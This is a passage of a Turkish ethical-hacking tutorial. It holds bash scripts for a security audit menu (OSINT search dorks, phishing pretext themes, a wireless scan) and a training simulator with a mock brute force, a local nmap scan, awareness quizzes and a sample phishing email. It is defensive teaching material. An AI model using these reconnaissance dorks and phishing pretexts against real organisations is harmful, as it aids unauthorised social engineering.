    echo "- Facebook: site:facebook.com \"$organization\"" >> $REPORT_DIR/social_engineering.txt
    
    # Phishing şablon önerileri
    echo "" >> $REPORT_DIR/social_engineering.txt
    echo "🎣 Phishing Test Şablonları:" >> $REPORT_DIR/social_engineering.txt
    echo "1. IT Güvenlik Güncellemesi" >> $REPORT_DIR/social_engineering.txt
    echo "2. HR Politika Değişikliği" >> $REPORT_DIR/social_engineering.txt
    echo "3. Şirket Etkinliği Daveti" >> $REPORT_DIR/social_engineering.txt
    echo "4. Acil IT Destek Talebi" >> $REPORT_DIR/social_engineering.txt
    
    echo "✅ Sosyal mühendislik hazırlığı tamamlandı: $REPORT_DIR/social_engineering.txt"
    echo "⚠️  Bu bilgileri sadece yetkili testlerde kullanın!"
}

# Kablosuz ağ taraması
wireless_security_audit() {
    echo "📡 Kablosuz Ağ Güvenlik Taraması"
    
    # Kablosuz interface kontrolü
    wireless_interfaces=$(iwconfig 2>/dev/null | grep "IEEE 802.11" | cut -d' ' -f1)
    
    if [ -z "$wireless_interfaces" ]; then
        echo "❌ Kablosuz interface bulunamadı!"
        return
    fi
    
    echo "📡 Kablosuz Ağlar:" > $REPORT_DIR/wireless_audit.txt
    echo "==================" >> $REPORT_DIR/wireless_audit.txt
    
    # Mevcut ağları tara
    for interface in $wireless_interfaces; do
        echo "Interface: $interface" >> $REPORT_DIR/wireless_audit.txt
        iwlist $interface scan | grep -E "(ESSID|Encryption|Quality)" >> $REPORT_DIR/wireless_audit.txt
    done
    
    # Güvenlik önerileri
    echo "" >> $REPORT_DIR/wireless_audit.txt
    echo "🔒 Güvenlik Önerileri:" >> $REPORT_DIR/wireless_audit.txt
    echo "- WEP şifreleme kullanan ağlardan kaçının" >> $REPORT_DIR/wireless_audit.txt
    echo "- Açık (şifresiz) ağlara dikkat edin" >> $REPORT_DIR/wireless_audit.txt
    echo "- WPA3 şifreleme tercih edin" >> $REPORT_DIR/wireless_audit.txt
    echo "- Güçlü parolalar kullanın" >> $REPORT_DIR/wireless_audit.txt
    
    echo "✅ Kablosuz tarama tamamlandı: $REPORT_DIR/wireless_audit.txt"
}

# Tam denetim raporu
generate_full_report() {
    echo "📊 Tam Güvenlik Denetim Raporu Oluşturuluyor..."
    
    # Tüm taramaları çalıştır
    system_security_audit
    read -p "Ağ taraması yapmak istiyor musunuz? (y/n): " do_network
    if [ "$do_network" = "y" ]; then
        network_security_audit
    fi
    
    read -p "Web taraması yapmak istiyor musunuz? (y/n): " do_web
    if [ "$do_web" = "y" ]; then
        web_application_audit
    fi
    
    # Özet rapor oluştur
    cat > $REPORT_DIR/executive_summary.md << EOF
# GÜVENLİK DENETİM RAPORU
========================

**Tarih:** $(date)
**Denetim Türü:** Kapsamlı Güvenlik Denetimi

## YÖNETİCİ ÖZETİ

Bu rapor sistemin genel güvenlik durumunu değerlendirmek amacıyla hazırlanmıştır.

### 🎯 TEMEL BULGULAR

#### Sistem Güvenliği
- Kullanıcı hesapları incelendi
- Açık portlar tespit edildi
- Servis konfigürasyonları değerlendirildi

#### Ağ Güvenliği
- Ağ trafiği analiz edildi
- Güvenlik açıkları tarandı
- Erişim kontrolleri değerlendirildi

### 📊 RİSK SKORU
- **Yüksek Risk:** [Manuel değerlendirme gerekli]
- **Orta Risk:** [Manuel değerlendirme gerekli]  
- **Düşük Risk:** [Manuel değerlendirme gerekli]

### 🔧 ÖNERİLER
1. Kritik sistem güncellemelerini yapın
2. Güçlü parola politikaları uygulayın
3. Gereksiz servisleri kapatın
4. Güvenlik izlemesi kurulumunu yapın
5. Düzenli yedekleme stratejisi oluşturun

### 📋 DETAYLAR
Detaylı bulgular için aşağıdaki dosyaları inceleyin:
- system_audit.txt: Sistem güvenlik detayları
- network_audit.txt: Ağ güvenlik analizi
- web_audit.txt: Web uygulama güvenliği
- wireless_audit.txt: Kablosuz ağ güvenliği

---
*Bu rapor otomatik araçlar kullanılarak oluşturulmuştur. Manuel doğrulama önerilir.*
EOF

    echo "✅ Tam denetim raporu oluşturuldu: $REPORT_DIR/"
    echo "📋 Özet rapor: $REPORT_DIR/executive_summary.md"
}

# Ana program
while true; do
    show_audit_menu
    read -p "Seçiminiz (1-7): " choice
    
    case $choice in
        1) system_security_audit ;;
        2) network_security_audit ;;
        3) web_application_audit ;;
        4) wireless_security_audit ;;
        5) social_engineering_test ;;
        6) generate_full_report ;;
        7) echo "👋 Güvenli günler!"; break ;;
        *) echo "❌ Geçersiz seçim!" ;;
    esac
    
    echo ""
    read -p "Ana menüye dönmek için Enter'a basın..."
done
```

### Proje 3: Güvenlik Eğitim Simülatörü
```bash
#!/bin/bash
# security_training_simulator.sh

echo "🎓 Güvenlik Eğitim Simülatörü"
echo "============================="

# Eğitim modülleri
show_training_menu() {
    echo ""
    echo "📚 Eğitim Modülleri:"
    echo "1. Password Cracking Simülasyonu"
    echo "2. Network Scanning Eğitimi"
    echo "3. Social Engineering Farkındalığı"
    echo "4. Incident Response Eğitimi"
    echo "5. Phishing Simülasyonu"
    echo "6. Çıkış"
}

# Password cracking eğitimi
password_training() {
    echo "🔓 Password Cracking Eğitimi"
    echo "============================"
    
    # Zayıf şifre örnekleri oluştur
    cat > weak_passwords.txt << EOF
123456
password
admin
qwerty
12345678
welcome
login
password123
admin123
guest
EOF
    
    echo "🎯 Bu eğitimde zayıf şifrelerin nasıl kırılabileceğini öğreneceksiniz."
    echo ""
    echo "📋 Yaygın zayıf şifreler:"
    cat weak_passwords.txt
    echo ""
    
    read -p "Brute force simülasyonu başlatılsın mı? (y/n): " start_sim
    if [ "$start_sim" = "y" ]; then
        echo "🔨 Brute force simülasyonu başlıyor..."
        
        # Simülasyon (gerçekte herhangi bir sisteme saldırmaz)
        target_password="password123"
        
        while IFS= read -r password; do
            echo "🔍 Denenen şifre: $password"
            sleep 0.5
            
            if [ "$password" = "$target_password" ]; then
                echo "✅ Şifre kırıldı: $password"
                echo ""
                echo "🛡️ SAVUNMA ÖNERİLERİ:"
                echo "- En az 12 karakter kullanın"
                echo "- Büyük-küçük harf, sayı ve sembol karışımı"
                echo "- Yaygın kelimeleri kullanmayın"
                echo "- İki faktörlü kimlik doğrulama açın"
                break
            else
                echo "❌ Yanlış şifre"
            fi
        done < weak_passwords.txt
    fi
    
    rm weak_passwords.txt
}

# Network scanning eğitimi
network_training() {
    echo "🌐 Network Scanning Eğitimi"
    echo "==========================="
    
    echo "🎯 Bu eğitimde ağ tarama tekniklerini öğreneceksiniz."
    echo ""
    
    read -p "Kendi bilgisayarınızı tarayalım mı? (y/n): " scan_self
    if [ "$scan_self" = "y" ]; then
        local_ip=$(ip route get 1 | awk '{print $7}' | head -1)
        echo "🔍 Yerel IP adresiniz taranıyor: $local_ip"
        
        echo ""
        echo "📋 NMAP Tarama Sonuçları:"
        echo "========================="
        nmap -F $local_ip
        
        echo ""
        echo "🛡️ SAVUNMA ÖNERİLERİ:"
        echo "- Gereksiz portları kapatın"
        echo "- Güvenlik duvarı kullanın"
        echo "- Servisleri güncel tutun"
        echo "- Erişim kontrolü uygulayın"
    fi
}

# Social engineering farkındalık eğitimi
social_engineering_awareness() {
    echo "🎭 Social Engineering Farkındalık Eğitimi"
    echo "=========================================="
    
    scenarios=(
        "Telefonda kendisini IT desteği olarak tanıtan biri şifrenizi soruyor"
        "E-posta ile şirket CEO'sundan acil para transferi talebi geliyor"
        "USB bellek parking alanında bulunuyor ve merak edip bilgisayarınıza takıyorsunuz"
        "LinkedIn'de tanımadığınız biri bağlantı isteği gönderiyor"
        "Fake Wi-Fi ağına bağlanıp kredi kartı bilgilerinizi giriyorsunuz"
    )
    
    echo "🎯 Aşağıdaki senaryoları değerlendirin:"
    echo ""
    
    for i in "${!scenarios[@]}"; do
        echo "📚 Senaryo $((i+1)): ${scenarios[i]}"
        echo ""
        read -p "Bu durum güvenli mi? (güvenli/tehlikeli): " answer
        
        if [[ $answer == "tehlikeli" ]]; then
            echo "✅ Doğru! Bu bir social engineering saldırısıdır."
        else
            echo "❌ Dikkat! Bu tehlikeli bir durumdur."
        fi
        echo ""
        
        # Her senaryo için açıklama
        case $i in
            0) echo "💡 İpucu: IT asla telefonda şifre sormaz!" ;;
            1) echo "💡 İpucu: CEO Fraud saldırısı! Doğrulama yapın." ;;
            2) echo "💡 İpucu: USB saldırıları yaygındır!" ;;
            3) echo "💡 İpucu: Bilinmeyen kişilerle bağlantı tehlikelidir!" ;;
            4) echo "💡 İpucu: Fake Wi-Fi ile veri çalınabilir!" ;;
        esac
        echo ""
        read -p "Devam etmek için Enter'a basın..."
    done
    
    echo "🎓 Eğitim tamamlandı! Social engineering saldırılarına karşı daha dikkatli olun."
}

# Incident response eğitimi
incident_response_training() {
    echo "🚨 Incident Response Eğitimi"
    echo "============================="
    
    echo "🎯 Bir güvenlik olayı simülasyonu yapacağız."
    echo ""
    
    # Simüle edilmiş güvenlik olayı
    cat > incident_scenario.txt << 'EOF'
GÜVENLIK OLAYI SENARYOSU
========================

Saat: 14:30
Durum: Çalışanlar e-postalarına erişemiyor
Log: Şüpheli ağ trafiği tespit edildi
Belirti: Bilgisayarlar yavaş çalışıyor
İpucu: Ransomware saldırısı olabilir
EOF

    echo "📋 Olay Bilgileri:"
    cat incident_scenario.txt
    echo ""
    
    response_steps=(
        "Olayı tespit etme ve belgeleme"
        "Etkilenen sistemleri izole etme"
        "Saldırı türünü belirleme"
        "İlgili birimleri bilgilendirme"
        "Kanıt toplama"
        "Sistem geri yükleme"
        "Güvenlik önlemlerini güçlendirme"
    )
    
    echo "🔧 Doğru müdahale sıralaması:"
    for i in "${!response_steps[@]}"; do
        echo "$((i+1)). ${response_steps[i]}"
    done
    
    echo ""
    read -p "Hangi adımla başlarsınız? (1-7): " first_step
    
    if [ "$first_step" = "1" ]; then
        echo "✅ Doğru! Önce olayı tespit edip belgeleyin."
    else
        echo "❌ Önce olayı tespit edip belgelemelisiniz!"
    fi
    
    rm incident_scenario.txt
}

# Phishing simülasyonu
phishing_simulation() {
    echo "🎣 Phishing Simülasyon Eğitimi"
    echo "=============================="
    
    echo "🎯 Gerçekçi phishing e-postalarını tanımayı öğrenin."
    echo ""
    
    # Örnek phishing e-postası
    cat > phishing_email.txt << 'EOF'
Konu: Acil - Hesap Güvenliği Uyarısı

Sayın Kullanıcı,

Hesabınızda şüpheli aktivite tespit ettik. Güvenliğiniz için 
hesabınızı 24 saat içinde doğrulamanız gerekmektedir.

Aşağıdaki bağlantıya tıklayarak hesabınızı güvenli hale getirin:
http://fake-bank-security.com/verify-account

Bu işlemi yapmazsanız hesabınız askıya alınacaktır.

Saygılarımızla,
Güvenlik Ekibi
EOF

    echo "📧 Örnek E-posta:"
    echo "=================="
    cat phishing_email.txt
    echo ""
    
    echo "🔍 Bu e-postada hangi şüpheli işaretler var?"
    echo "1. Acil dil kullanımı"
    echo "2. Şüpheli URL"
    echo "3. Genel hitap (Sayın Kullanıcı)"
    echo "4. Tehdit içeriği"
    echo ""
    
    read -p "Bu e-posta güvenilir mi? (evet/hayır): " trust_email
    
    if [[ $trust_email == "hayır" ]]; then
        echo "✅ Doğru! Bu tipik bir phishing e-postasıdır."
        echo ""
        echo "🛡️ KORUNMA YÖNTEMLERİ:"
        echo "- URL'leri kontrol edin"
        echo "- Acil dil kullanan e-postalara dikkat"
        echo "- Doğrudan bankayı arayın"
        echo "- Anti-phishing yazılımı kullanın"
    else
        echo "❌ DİKKAT! Bu bir phishing saldırısıdır!"
        echo "Asla bu tür bağlantılara tıklamayın!"
    fi
    
    rm phishing_email.txt
}

# Ana eğitim döngüsü
while true; do
    show_training_menu
    read -p "Seçiminiz (1-6): " choice
    
    case $choice in
        1) password_training ;;
        2) network_training ;;
        3) social_engineering_awareness ;;
        4) incident_response_training ;;
        5) phishing_simulation ;;
        6) echo "🎓 Eğitim tamamlandı! Güvenli kalın."; break ;;
        *) echo "❌ Geçersiz seçim!" ;;
    esac
    
    echo ""
    read -p "Ana menüye dönmek için Enter'a basın..."
    clear
done
```

---

## 🎓 Özet ve Gelecek Adımları

### 📝 Bu Bölümde Öğrendiklerimiz:

1. **Meterpreter**: Post-exploitation işlemleri ve session yönetimi
2. **SMTP**: E-posta servisi analizi ve güvenlik testleri  
3. **Manuel Testing**: Kapsamlı penetrasyon test teknikleri
4. **Automation**: Güvenlik testlerini otomatikleştirme
5. **Defense**: Saldırıları tespit etme ve savunma yöntemleri

### 🏆 Pratik Beceriler:

- **Payload oluşturma** ve yönetme
- **Network pivoting** ve lateral movement
- **Social engineering** teknikleri
- **Incident response** prosedürleri
- **Security awareness** eğitimi

### 🔮 Gelecek Öğrenme Yolları:

1. **İleri Metasploit**: Custom exploit geliştirme
2. **Binary Exploitation**: Buffer overflow ve ROP
3. **Web Application Security**: OWASP Top 10 detayları
4. **Mobile Security**: Android/iOS penetrasyon testleri
5. **Cloud Security**: AWS/Azure güvenlik testleri

### 🛡️ Son Hatırlatmalar:

- **Etiği unutmayın** - Sadece izinli sistemlerde test yapın
- **Sürekli öğrenin** - Güvenlik alanı hızla gelişiyor
- **Topluma katkı sağlayın** - Güvenlik açıklarını sorumlu şekilde bildirin
- **Legal sınırlara uyun** - Yasalara ve kurallara saygı gösterin

---

## 🏅 Tebrikler!

Bu kapsamlı güvenlik eğitimini tamamladınız! Artık:

✅ Ağ keşfi ve tarama yapabilirsiniz  
✅ Uzaktan erişim sistemlerini yönetebilirsiniz  
✅ Güvenlik testleri gerçekleştirebilirsiniz  
✅ Savunma stratejileri geliştirebilirsiniz

**Artık gerçek bir etik hacker'sınız!** 🎉

### 📚 Ek Kaynaklar:

- **Kitaplar**: "The Web Application Hacker's Handbook", "Metasploit: The Penetration Tester's Guide"
- **Platformlar**: HackTheBox, TryHackMe, VulnHub
- **Sertifikalar**: CEH, OSCP, CISSP
- **Topluluklar**: OWASP, Defcon grupları

### 🚀 Sonraki Adımlar:

1. **Kendi lab'ınızı kurun** - Sanal makineler ve test ortamları
2. **CTF'lere katılın** - Becerilerinizi yarışmalarda test edin
3. **Bug bounty programlarına başlayın** - Gerçek uygulamalarda açık arayın
4. **Toplulukla bağlantı kurun** - Diğer güvenlik uzmanları ile tanışın
5. **Sürekli öğrenmeyi sürdürün** - Yeni teknikler ve araçları takip edin

---

## 🛡️ SON UYARI

Bu rehberde öğrendiğiniz tüm teknikler **sadece eğitim ve yasal penetrasyon testleri** için tasarlanmıştır. 

**ASLA:**
- Başkalarının sistemlerine izinsiz erişim sağlamayın
- Zarar verici faaliyetlerde bulunmayın
- Kişisel verileri çalmayın veya ifşa etmeyin
- Bu bilgileri kötü niyetli amaçlarla kullanmayın

**DAIMA:**
- Yasal sınırlar içinde kalın
- Etik kurallara uyun
- İzin almadan test yapmayın
- Sorumlu açık bildirimi yapın

Güvenlik alanında başarılar dileriz! 🌟

---

*"Bilgiyle gelen güç, sorumlulukla birlikte gelir."*

**Happy Hacking! (Ethically)** 🚀🛡️